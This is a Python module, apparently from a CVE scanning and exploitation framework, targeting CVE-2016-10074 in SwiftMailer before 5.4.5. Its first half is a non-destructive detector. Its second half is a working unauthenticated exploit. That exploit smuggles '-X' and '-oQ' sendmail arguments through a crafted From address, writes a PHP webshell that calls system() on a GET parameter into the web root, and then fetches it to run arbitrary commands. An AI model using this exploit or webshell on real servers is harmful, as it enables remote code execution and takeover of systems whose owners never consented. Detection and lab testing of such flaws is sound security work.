#!/usr/bin/env python3
from __future__ import annotations

from modules.cves.metadata import metadata_dict_for as _metadata_dict_for

META = _metadata_dict_for('CVE-2016-10074')

# ---------------------------------------------------------------------------
# Detection half
# ---------------------------------------------------------------------------
"""
CVE-2016-10074 — SwiftMailer < 5.4.5 sendmail/mail() argument injection -> RCE (BEHAVIORAL DETECTOR)

Mechanism:
    swiftmailer/swiftmailer <= 5.4.4 formats the reverse-path (From/Sender/Return-Path) into PHP
    mail()'s 5th "additional_params" argument via sprintf('-f%s', $reversePath) WITHOUT validation.
    PHP mail() applies escapeshellcmd() — which blocks shell metacharacters (; | $ `) but NOT
    argument injection. A crafted address such as

        "x\\" -oQ/tmp/ -X/path/shell.php "@x.com

    therefore smuggles extra sendmail arguments (-oQ, -X<file>); -X writes a transfer log (containing
    the attacker message body) to a web-accessible PHP file => RCE. Patched in 5.4.5 via
    Swift_Transport_MailTransport::_isShellSafe(), which strips -f entirely on unsafe input.

DETECTION (behavioral, non-destructive, no real MTA needed):
    The lab points PHP mail() at a fake sendmail that records its raw argv to a web-readable log.
    This detector submits a benign-looking marker payload whose reverse-path injects a harmless
    "-O<marker>" argument, then reads the argv log: if the injected token appears as its OWN argv
    entry (split off by sendmail), the unvalidated reverse-path reached the command line => VULNERABLE.
    A patched 5.4.5+ build strips -f and the token never appears as a separate arg.

    Falls back to a version-string fingerprint (Swift::VERSION rendered by the endpoint) when the
    argv log is not reachable.
"""

import re
import time
import requests

from modules.core import http_config

requests.packages.urllib3.disable_warnings(
    requests.packages.urllib3.exceptions.InsecureRequestWarning
)


def _safe_post(sess, url, data, timeout=10):
    try:
        return sess.post(url, data=data, timeout=timeout, verify=False)
    except Exception:
        return None


def _safe_get(sess, url, timeout=10):
    try:
        return sess.get(url, timeout=timeout, verify=False)
    except Exception:
        return None


def scan(target_url: str, *, session=None, username=None, password=None, **kwargs):
    if not target_url:
        return {"cve_id": "CVE-2016-10074", "vulnerable": False, "error": "no target"}

    sess = session or http_config.get_auth_session()

    if not target_url.startswith(("http://", "https://")):
        target_url = "http://" + target_url
    base = target_url.rstrip("/")

    result = {
        "cve_id": "CVE-2016-10074",
        "name": "SwiftMailer < 5.4.5 sendmail/mail() argument injection (RCE)",
        "vulnerable": False,
        "status": "not_detected",
        "verdict": "not_detected",
        "proof_type": None,
        "version": None,
        "endpoint": None,
        "evidence": [],
        "detection_methods": [],
        "error": None,
    }

    # A unique, harmless injected argument token. -O is a benign sendmail option name; if argument
    # injection works, "-O<marker>" arrives as its OWN argv entry. The reverse-path MUST begin with a
    # quote so it passes SwiftMailer's RFC-2822 grammar (a quoted-string local part); a bare atom
    # before the quote is rejected by setReturnPath()/setFrom() before mail() is ever called.
    marker = "INJ%d" % int(time.time())
    payload_from = '"probe\\" -O%s "@example.com' % marker

    endpoint = base + "/index.php"
    r = _safe_post(sess, endpoint, {"from": payload_from, "body": "detector probe"})

    # Pull the SwiftMailer version the endpoint echoes (also used as the fingerprint fallback).
    if r is not None and r.text:
        result["endpoint"] = endpoint
        m = re.search(r"SwiftMailer version:\s*([0-9][0-9A-Za-z._-]*)", r.text)
        if m:
            result["version"] = m.group(1)

    # --- Primary: behavioral argv-injection check -------------------------------
    # The benign baseline is always exactly ARG[0]=-t ARG[1]=-i ARG[2]=-f<addr>. A vulnerable build
    # splits the unvalidated reverse-path into EXTRA argv entries (ARG[3]+), one of which carries our
    # injected -O<marker> token. We match structurally (marker substring in an ARG[>=3] line) so the
    # check is robust to escapeshellcmd / shell re-split artifacts around the token.
    time.sleep(0.5)
    log = _safe_get(sess, base + "/runtime/sendmail_argv.log")
    if log is not None and log.status_code == 200 and "ARG[" in log.text:
        injected = False
        for line in log.text.splitlines():
            m = re.match(r"ARG\[(\d+)\]=(.*)$", line.strip())
            if m and int(m.group(1)) >= 3 and marker in m.group(2):
                injected = True
                break
        if injected:
            result["vulnerable"] = True
            result["status"] = "confirmed_vulnerable"
            result["verdict"] = "confirmed_vulnerable"
            result["proof_type"] = "safe_active"
            result["detection_methods"].append("argv_injection_observed")
            result["evidence"].append(
                "Injected sendmail arg carrying -O%s arrived as a separate argv entry (ARG[>=3]) — "
                "the unvalidated reverse-path reached the sendmail command line" % marker
            )
            return result
        else:
            result["detection_methods"].append("argv_log_present_no_injection")
            result["evidence"].append(
                "sendmail argv captured but injected token not present as a separate arg "
                "(reverse-path appears sanitized -> patched >= 5.4.5)"
            )

    # --- Fallback: version fingerprint ------------------------------------------
    ver = result.get("version")
    if ver:
        def _vuln_version(v):
            try:
                parts = [int(x) for x in re.findall(r"\d+", v)[:3]]
                while len(parts) < 3:
                    parts.append(0)
                return tuple(parts) < (5, 4, 5)
            except Exception:
                return False

        if _vuln_version(ver):
            result["status"] = "version_applicable"
            result["verdict"] = "version_applicable"
            result["proof_type"] = "version"
            result["detection_methods"].append("version_fingerprint")
            result["evidence"].append("SwiftMailer %s < 5.4.5 (CVE-2016-10074 unpatched)" % ver)
        else:
            result["status"] = "blocked_by_control"
            result["verdict"] = "blocked_by_control"
            result["proof_type"] = "version"
            result["evidence"].append("SwiftMailer %s >= 5.4.5 (patched)" % ver)
    elif not result["detection_methods"]:
        result["error"] = "No SwiftMailer endpoint/argv log found at target"

    return result


# ---------------------------------------------------------------------------
# Exploitation half
# ---------------------------------------------------------------------------
"""CVE-2016-10074 exploitation half — SwiftMailer < 5.4.5 sendmail argument injection -> RCE.

Split from the original modules/cve_2016_10074.py (detection half: modules/cves/cve_2016_10074.py).
Exploitation may import from modules root (shared infra) and modules.detection.
"""

import re
import time
import requests

from modules.core import http_config

requests.packages.urllib3.disable_warnings(
    requests.packages.urllib3.exceptions.InsecureRequestWarning
)


def exploit(target_url: str, *, username: str = None, password: str = None,
            command: str = None, options: dict = None, session=None, **kwargs) -> dict:
    """Exploit CVE-2016-10074 — SwiftMailer < 5.4.5 sendmail argument injection -> RCE.

    Unauthenticated. Mirrors the lab's exploit.py ground truth:
      1. POST /index.php with a reverse-path (From) that injects sendmail's -X<file> arg,
         pointing it at a .php file under the web root, with a PHP webshell in the message body.
      2. The mail() transport hands the unvalidated reverse-path to sendmail; -X makes it write
         the message body (= our PHP) to the web-readable runtime/<shell>.php.
      3. Fetch that shell with ?c=<command>; RCE confirmed only if our markers + output appear.

    command is delivered via the GET ?c= param at fetch time (NEVER embedded in the mail body —
    SwiftMailer QP-encodes the body, so a '=' inside it would corrupt the written PHP). The static
    webshell body is '='-free and short to survive QP-encoding intact.
    """
    sess = session or http_config.get_auth_session()
    cve = "CVE-2016-10074"
    result = {
        "cve": cve,
        "attempted": True,
        "success": False,
        "vuln_class": "rce",
        "evidence": "",
        "detail": "",
        "artifacts": {},
        "requires": [],
        "reason": "",
    }

    try:
        if not target_url:
            result["success"] = False
            result["reason"] = "no target url"
            return result
        if not target_url.startswith(("http://", "https://")):
            target_url = "http://" + target_url
        base = target_url.rstrip("/")

        cmd = command if command else "echo CVE-2016-10074 PoC && id && hostname"

        # Unique webshell name per run -> no stale-file false positives.
        stamp = int(time.time())
        shell_name = "x_%d.php" % stamp
        shell_rel = "runtime/" + shell_name
        # The lab serves public/ as docroot; runtime/ is a writable volume under it.
        shell_abs = "/var/www/html/public/" + shell_rel

        # Unique markers framing system() output: proves PHP EXECUTED (raw source disclosure would
        # not contain the echoed marker text), and lets us slice out exactly the command output.
        m1 = "Z1Z%dZ" % stamp
        m2 = "Z2Z%dZ" % stamp
        # '='-free, short (< 76 chars) body so SwiftMailer's quoted-printable body encoder leaves it
        # byte-intact in the -X transfer log it writes to disk. Command comes via ?c= at fetch time.
        webshell = '<?php echo "%s";system($_GET["c"]);echo "%s";?>' % (m1, m2)

        # Reverse-path MUST begin with a quote (quoted-string local part) to pass SwiftMailer's
        # RFC-2822 address grammar; a bare atom before the quote is rejected before mail() is called.
        payload_from = '"attacker\\" -oQ/tmp/ -X%s "@x.com' % shell_abs

        endpoint = base + "/index.php"

        # --- 1. baseline benign send (mirrors the PoC; keeps argv log framing sane) ---
        _safe_post(sess, endpoint, {"from": "visitor@example.com", "body": "benign body"})

        # --- 2. inject the malicious reverse-path + PHP body ---
        r = _safe_post(sess, endpoint, {"from": payload_from, "body": webshell}, timeout=15)
        if r is None:
            result["success"] = False
            result["reason"] = "target unreachable (POST /index.php failed)"
            result["requires"] = ["network", "lab_running"]
            return result

        result["artifacts"]["endpoint"] = endpoint
        result["artifacts"]["payload_from"] = payload_from
        result["artifacts"]["webshell_path"] = shell_abs

        # --- 3. confirm argument injection from the captured argv log (supporting evidence) ---
        time.sleep(1.0)
        injection_seen = False
        log = _safe_get(sess, base + "/runtime/sendmail_argv.log", timeout=15)
        if log is not None and log.status_code == 200 and "ARG[" in log.text:
            needle = "-X" + shell_abs
            for line in log.text.splitlines():
                mm = re.match(r"ARG\[(\d+)\]=(.*)$", line.strip())
                if mm and int(mm.group(1)) >= 3 and needle in mm.group(2):
                    injection_seen = True
                    break

        # --- 4. confirm RCE: fetch the written webshell with the command ---
        shell_url = base + "/" + shell_rel
        result["artifacts"]["webshell_url"] = shell_url + "?c=" + cmd
        sh = None
        try:
            sh = sess.get(shell_url, params={"c": cmd}, timeout=15, verify=False)
        except Exception:
            sh = None

        if sh is not None and sh.status_code == 200 and m1 in sh.text and m2 in sh.text:
            out = sh.text.split(m1, 1)[1].split(m2, 1)[0].strip()
            result["success"] = True
            result["evidence"] = out
            result["detail"] = (
                "RCE: argument injection wrote+executed a PHP webshell via sendmail -X; "
                "command %r output captured" % cmd
            )
            result["artifacts"]["command"] = cmd
            result["artifacts"]["argv_injection_confirmed"] = injection_seen
            return result

        # No marker output -> command did not execute. Honest failure (output required for success).
        result["success"] = False
        if injection_seen:
            result["evidence"] = (
                "sendmail argument injection CONFIRMED: '-X%s' arrived as a separate argv entry "
                "(unvalidated reverse-path reached the command line), but the written webshell did "
                "not execute / was not web-served in this environment." % shell_abs
            )
            result["detail"] = "Argument injection proven; webshell did not execute -> no command output"
            result["reason"] = (
                "argument injection observed but webshell fetch returned no executed marker output "
                "(runtime/ may not execute PHP, or target patched mid-flight)"
            )
            result["artifacts"]["argv_injection_confirmed"] = True
        else:
            result["reason"] = (
                "no argument injection observed and no webshell output -> target appears patched "
                "(SwiftMailer >= 5.4.5 strips -f on unsafe reverse-path) or endpoint not vulnerable"
            )
        return result

    except Exception as e:
        result["success"] = False
        result["reason"] = "exploit error: %s" % e
        return result
